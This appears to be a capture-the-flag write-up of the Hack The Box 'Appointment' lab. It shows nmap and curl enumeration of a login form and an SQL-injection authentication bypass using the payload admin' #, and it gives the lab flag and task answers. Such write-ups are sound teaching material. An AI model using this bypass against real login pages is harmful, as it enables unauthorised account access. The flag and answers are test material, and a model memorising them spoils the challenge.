# Hack The Box — Appointment

<p align="center">
  <img src="https://img.shields.io/badge/Hack%20The%20Box-Starting%20Point-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=white" alt="Hack The Box">
  <img src="https://img.shields.io/badge/Category-Web-111111?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Vulnerability-SQL%20Injection-orange?style=for-the-badge" alt="SQL Injection">
</p>

<p align="center">
  <b>Authentication Bypass through SQL Injection</b>
</p>

---

## Machine Information

| Property | Details |
|----------|---------|
| Platform | Hack The Box |
| Module | Starting Point |
| Machine | Appointment |
| Category | Web |
| Vulnerability | SQL Injection |
| Attack | Authentication Bypass |
| Status | Completed |

---

## Overview

**Appointment** is a Hack The Box Starting Point machine focused on **SQL Injection**.

The target exposes a web application with a login page. After identifying the login form and understanding how its parameters are submitted, SQL injection can be used to manipulate the backend SQL query and bypass authentication.

The final payload used was:

```text
admin' #
```

This allowed authentication without knowing the password.

---

# 1. Reconnaissance

The target IP address was:

```text
10.129.133.84
```

I started with an Nmap service and version scan.

```bash
sudo nmap -sV 10.129.133.84
```

### Nmap

![Nmap scan](screenshots/01-nmap.png)

### Findings

The target exposed a web service on port `80`.

The web server was identified as:

```text
Apache httpd 2.4.38
```

The scan indicated that the target was running a Debian/Linux-based web server.

The important finding was:

```text
80/tcp
HTTP
Apache httpd 2.4.38
```

Since HTTP was exposed, I moved to web enumeration.

---

# 2. Web Application Enumeration

I opened the target in a browser:

```text
http://10.129.133.84
```

The application displayed a login page containing:

```text
Username
Password
Login
```

### Login Page

![Appointment login page](screenshots/02-login-page.png)

At this stage, the main attack surface appeared to be the login form.

---

# 3. Understanding the Login Form

Instead of immediately trying random payloads, I inspected the HTML source of the page.

I first retrieved the page using:

```bash
curl -s http://10.129.133.84
```

The page contained the login form:

```html
<form class="login100-form validate-form" method="post">
```

The form did not specify an `action` attribute, meaning the POST request was submitted back to the same URL.

I then searched the HTML for form and input elements:

```bash
curl -s http://10.129.133.84 | grep -E 'form|input'
```

This revealed:

```html
<input class="input100" type="text" name="username" placeholder="Username">

<input class="input100" type="password" name="password" placeholder="Password">
```

### Finding

The application accepts two important POST parameters:

```text
username
password
```

The request structure was therefore:

```text
POST /
username=<value>
password=<value>
```

### Source Enumeration

![Login form source](screenshots/03-source-code.png)

---

# 4. Testing Normal Credentials

Before testing for SQL injection, I tried ordinary credentials:

```text
Username: test
Password: test
```

Using `curl`, the request could be reproduced with:

```bash
curl -i -X POST http://10.129.133.84/ \
  -d "username=test&password=test"
```

The application returned the login page again rather than authenticating.

This established the normal behavior of the login form.

---

# 5. Testing for SQL Injection

The challenge was specifically focused on SQL Injection.

The general idea behind SQL injection is that user-controlled input may become part of a SQL query.

A vulnerable application might conceptually construct a query such as:

```sql
SELECT * FROM users
WHERE username = '<username>'
AND password = '<password>';
```

If user input is not safely handled, the input may alter the intended SQL query.

---

## Initial SQL Injection Test

I first tested a single quote:

```text
'
```

using:

```bash
curl -i -X POST http://10.129.133.84/ \
  -d "username='&password=test"
```

The application continued returning the login page.

This test alone did not prove SQL injection, but it was useful for understanding how the application handled input.

---

# 6. Understanding the MySQL Comment Character

The important clue was the MySQL comment character:

```text
#
```

In MySQL, `#` can be used to comment out the remainder of a line.

The objective was therefore to terminate the username value and comment out the password condition.

The payload used was:

```text
admin' #
```

---

# 7. Authentication Bypass

I entered:

```text
Username: admin' #
Password: anything
```

The equivalent `curl` request was:

```bash
curl -i -X POST http://10.129.133.84/ \
  -d "username=admin' #&password=test"
```

### Payload

```text
admin' #
```

### SQL Logic

A vulnerable query might look like:

```sql
SELECT * FROM users
WHERE username = 'admin' #'
AND password = 'test';
```

Everything after `#` is treated as a comment.

Therefore, the password condition is effectively ignored.

The query becomes conceptually:

```sql
SELECT * FROM users
WHERE username = 'admin';
```

This allows the application to authenticate as the `admin` user without knowing the password.

### Authentication Bypass

![SQL injection authentication bypass](screenshots/04-sql-test.png)

---

# 8. Successful Login

After submitting:

```text
admin' #
```

with an arbitrary password, the application authenticated successfully.

The page displayed:

```text
Congratulations!
```

### Successful Authentication

![Successful authentication](screenshots/05-auth-bypass.png)

This confirmed that the login form was vulnerable to SQL injection.

---

# 9. Flag Retrieval

After bypassing the login, the application displayed the flag on the resulting webpage.

The flag was:

```text
e3d0796d002a446c0e622226f42e9672
```

### Flag

![Appointment flag](screenshots/06-flag.png)

---

# 10. Attack Chain

The complete attack path was:

```text
Target
  |
  v
Nmap Enumeration
  |
  v
HTTP on Port 80
  |
  v
Apache 2.4.38
  |
  v
Login Page
  |
  v
HTML Source Enumeration
  |
  v
username + password parameters
  |
  v
Test Input
  |
  v
SQL Injection
  |
  v
admin' #
  |
  v
Password Condition Commented Out
  |
  v
Authentication Bypass
  |
  v
Congratulations!
  |
  v
FLAG
```

---

# 11. Commands Used

## Nmap

```bash
sudo nmap -sV 10.129.133.84
```

## Retrieve Webpage

```bash
curl -s http://10.129.133.84
```

## Find Form/Input Elements

```bash
curl -s http://10.129.133.84 | grep -E 'form|input'
```

## Test Normal Login

```bash
curl -i -X POST http://10.129.133.84/ \
  -d "username=test&password=test"
```

## Test SQL Input

```bash
curl -i -X POST http://10.129.133.84/ \
  -d "username='&password=test"
```

## Authentication Bypass

```bash
curl -i -X POST http://10.129.133.84/ \
  -d "username=admin' #&password=test"
```

---

# 12. Task Answers

| Task | Answer |
|------|--------|
| Task 1 | Structured Query Language |
| Task 2 | SQL Injection |
| Task 4 | A03:2021 – Injection |
| Task 5 | Apache httpd 2.4.38 |
| Task 6 | 443 |
| Task 7 | Directory |
| Task 8 | 404 |
| Task 9 | `dir` |
| Task 10 | `#` |
| Task 11 | Congratulations! |

---

# 13. Vulnerability Summary

| Item | Finding |
|------|---------|
| Attack Surface | Web Login |
| Web Server | Apache 2.4.38 |
| Input | `username` |
| Input | `password` |
| Vulnerability | SQL Injection |
| Impact | Authentication Bypass |
| Payload | `admin' #` |
| Result | Logged in as admin |

---

# 14. Why the Vulnerability Worked

The core problem was **unsafe handling of user input in an SQL query**.

Instead of treating the username strictly as data, the application appears to have incorporated it directly into SQL syntax.

The payload:

```text
admin' #
```

performed two important actions:

```text
admin'
   |
   +-- Closes the original username string

#
|
+-- Comments out the remaining SQL
```

This effectively removed the password check from the query.

---

# 15. Lessons Learned

### 1. Enumerate Before Exploiting

The login page alone did not immediately reveal the vulnerability.

Inspecting the HTML showed exactly how the application accepted input:

```text
username
password
```

Understanding the request made it possible to reproduce the login using `curl`.

---

### 2. Inspect Source Code

The HTML source revealed:

```html
<form method="post">
```

and:

```html
name="username"
name="password"
```

Source-code inspection is therefore an important part of web enumeration.

---

### 3. Understand SQL Syntax

The successful payload was not random.

It relied on understanding:

```text
'
```

to terminate a SQL string and:

```text
#
```

to comment out the remaining query.

---

### 4. Compare Application Behavior

Testing normal input before malicious input provides a baseline.

The workflow was:

```text
Normal Input
     |
     v
Observe Response
     |
     v
Modified Input
     |
     v
Compare Behavior
```

---

### 5. Understand the Vulnerability

The important lesson is not simply:

```text
admin' #
```

Instead, the important concept is:

```text
User Input
    |
    v
SQL Query
    |
    v
Input Changes Query Logic
    |
    v
Authentication Bypass
```

Understanding this makes it easier to recognize similar SQL injection vulnerabilities in other applications.

---

# 16. Final Takeaway

The **Appointment** machine demonstrates a classic SQL injection authentication bypass.

The key attack was:

```text
Login Page
    ↓
Identify POST Parameters
    ↓
Test Input Handling
    ↓
Identify SQL Injection
    ↓
Use MySQL Comment Character
    ↓
admin' #
    ↓
Bypass Password Verification
    ↓
Authenticate as admin
    ↓
Retrieve Flag
```

> **Don't memorize the payload. Understand why it works.**

---

## Flag

```text
e*********************
```

---

## Disclaimer

This writeup documents activity performed against an intentionally vulnerable **Hack The Box Starting Point** machine for educational purposes.

Do not use these techniques against systems without explicit authorization.
